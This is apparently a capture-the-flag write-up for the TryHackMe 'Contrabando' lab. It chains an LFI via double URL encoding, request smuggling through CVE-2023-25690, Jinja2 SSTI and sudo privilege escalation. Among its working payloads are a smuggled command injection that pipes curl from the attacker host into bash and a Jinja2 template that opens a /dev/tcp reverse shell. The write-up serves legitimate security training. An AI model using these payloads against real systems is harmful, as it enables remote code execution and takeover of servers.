# TryHackMe - Contrabando

> *These notes were written with AI assistance for English clarity. Attack paths and commands reflect my own work on the room.*

**Difficulty:** Hard  
**Category:** Web, LFI, HTTP Request Smuggling, SSTI, Privilege Escalation  
**Room:** [Contrabando](https://tryhackme.com/room/contrabando)  
**Description:** Never tell me the odds.

## Introduction

*"Never tell me the odds."* A hard-rated machine chaining vulnerabilities across a reverse proxy, a Docker backend, an internal Flask service, and two creative privilege escalation paths. Expect LFI, CVE-2023-25690 HTTP request smuggling, Jinja2 SSTI, bash glob matching, and Python 2 `input()` code execution.

**Objectives:**
- Exploit LFI to map the dual-Apache architecture
- Smuggle a POST request to achieve RCE in a backend container
- Pivot to an internal Flask service and exploit SSTI
- Escalate from `hansolo` to root via `vault` and `app.py`

---

## Reconnaissance

```bash
nmap -sS -p- --min-rate 5000 <TARGET_IP>
nmap -sV -sC -p 22,80 <TARGET_IP>
```

| Port | Service |
|------|---------|
| 22 | SSH |
| 80 | Apache 2.4.55 (frontend reverse proxy) |

Add to `/etc/hosts`:

```
<TARGET_IP>  contrabando.thm
```

The main site links to `/page/home.html`. Directory fuzzing on `/page/` with extensions reveals `index.php` and `gen.php`.

---

## Stage 1 — LFI & Architecture Discovery

### Local File Inclusion

The `/page/` endpoint passes user input to `readfile()`. Standard traversal is blocked by the proxy, but **double URL encoding** bypasses the filter:

```
/page/%2e%2e%252f%2e%2e%252f%2e%2e%252f%2e%2e%252f%2e%2e%252f%2e%2e%252f%2e%2e/etc/passwd
```

Read `/etc/apache2/sites-available/000-default.conf` to confirm a backend on port `8080`.

### Dual-server fingerprint

Malformed LFI requests return error headers revealing **Apache 2.4.54** on `172.18.0.3:8080` — a backend inside Docker, separate from the frontend 2.4.55 proxy.

### Source code via LFI

| File | Finding |
|------|---------|
| `index.php` | `readfile($_GET['page'])` — classic LFI |
| `gen.php` | Command injection via unsanitized `$_POST['length']` in `exec()` |

`gen.php` is only reachable on the backend — the proxy converts POST to GET, blocking direct exploitation.

---

## Stage 2 — HTTP Request Smuggling (CVE-2023-25690)

Apache 2.4.0–2.4.55 with `mod_proxy` is vulnerable to CRLF injection in rewrite rules, enabling request smuggling.

### Verify CRLF injection

```
GET /page/index.php%20HTTP/1.1%0d%0aFoo:%20baarr HTTP/1.1
Host: contrabando.thm
```

A `200 OK` response suggests the backend processed the smuggled prefix.

### Smuggle a POST to gen.php

Craft a smuggled POST with a reverse shell payload in the `length` parameter:

```http
GET /page/gen.php HTTP/1.1
Host: backend-server:8080

POST /gen.php HTTP/1.1
Host: backend-server:8080
Content-Type: application/x-www-form-urlencoded
Content-Length: <LEN>

length=1;$(curl -s <YOUR_IP>/shell.sh|bash) HTTP/1.1
Host: contrabando.thm
```

URL-encode the entire payload and send via Burp or curl `--path-as-is`. Catch the shell as `www-data` inside the Docker container.

---

## Stage 3 — Internal Network Pivot

From the container, scan the Docker network:

```bash
./nmap -min-rate 5000 172.18.0.0/24
```

Port `5000` on `172.18.0.1` runs a **Werkzeug/Flask** application. Use Ligolo-ng, chisel, or SSH tunneling to reach it from your attack box.

---

## Stage 4 — Flask SSTI → User Shell

The Flask app fetches a user-supplied URL and passes the response into `render_template_string()` — classic **Jinja2 SSTI**.

### Confirm SSTI

Host a file containing `{{7*7}}` and submit its URL via POST:

```bash
curl -s -X POST "http://<INTERNAL_IP>:5000/" \
  -d "website_url=http://<YOUR_IP>/test.html"
```

If the response contains `49`, SSTI is confirmed.

### File read via file://

```
website_url=file:///home/hansolo/app/app.py
```

Read `/proc/self/environ` and `/proc/self/cmdline` to map the application path and user.

### Reverse shell

Host a Jinja2 RCE payload:

```jinja2
{{request.application.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1"').read()}}
```

Catch the shell as `hansolo` and grab the user flag.

---

## Stage 5 — Privilege Escalation to Root

```bash
sudo -l
```

| Entry | Notes |
|-------|-------|
| `(ALL) NOPASSWD: /usr/bin/bash /usr/bin/vault` | Password comparison script |
| `(ALL) /usr/bin/python* /opt/generator/app.py` | Requires a password |

### vault — Glob pattern bypass

`/usr/bin/vault` compares user input to `/root/password` with **unquoted variables**:

```bash
if [[ $content == $user_input ]]; then
```

In bash, `[[ == ]]` without quotes performs **glob matching**. Input `*` matches any non-empty string and prints `/root/secrets`.

### Brute-force the password

Brute one character at a time by appending `*`:

```python
import subprocess, string

CMD = ["sudo", "/usr/bin/bash", "/usr/bin/vault"]
CHARS = string.ascii_letters + string.digits + string.punctuation
CHARS = CHARS.replace("*", "").replace("?", "").replace("[", "").replace("]", "")

password = ""
while True:
    found = False
    for c in CHARS:
        proc = subprocess.run(CMD, input=f"{password}{c}*\n",
                              text=True, capture_output=True)
        if "Password matched!" in proc.stdout:
            password += c
            found = True
            break
    if not found:
        break
print(f"Password: {password}")
```

This recovers the password for `sudo python2 /opt/generator/app.py`.

### app.py — Python 2 input() RCE

In **Python 2**, `input()` evaluates input as code (equivalent to `eval(raw_input())`):

```bash
sudo python2 /opt/generator/app.py
# enter recovered password when prompted
# at the "add words" prompt:
__import__("os").system("/bin/bash")
```

Root shell obtained. Read the root flag.

---

## Flags

| Flag | How to obtain |
|------|---------------|
| User flag | `/home/hansolo/` after SSTI shell |
| Root flag | `/root/` after Python 2 privesc |

*Flag values intentionally omitted. Complete the room on [TryHackMe](https://tryhackme.com/room/contrabando).*

---

## Conclusion

### What I learned

| Concept | Lesson |
|---------|--------|
| Double URL encoding | Proxy filters may miss encoded traversal sequences |
| CVE-2023-25690 | CRLF in mod_proxy enables smuggling past reverse proxies |
| Request smuggling | Frontend/backend desync routes hidden requests to backend apps |
| Jinja2 SSTI | `render_template_string()` with user-controlled content = RCE |
| Bash glob in `[[ ]]` | Unquoted `==` enables wildcard password bypass |
| Python 2 `input()` | Never use `input()` for user data — it evaluates arbitrary code |

---

## References

- [CVE-2023-25690 PoC](https://github.com/dhmosfunk/CVE-2023-25690-POC)
- [PortSwigger — HTTP Request Smuggling](https://portswigger.net/web-security/request-smuggling)
- [0xH1S Writeup](https://medium.com/@0xH1S/contrabando-writeup-tryhackme-b3b966ea51b0)
- [0xb0b Writeup](https://0xb0b.gitbook.io/writeups/tryhackme/2025/contrabando)
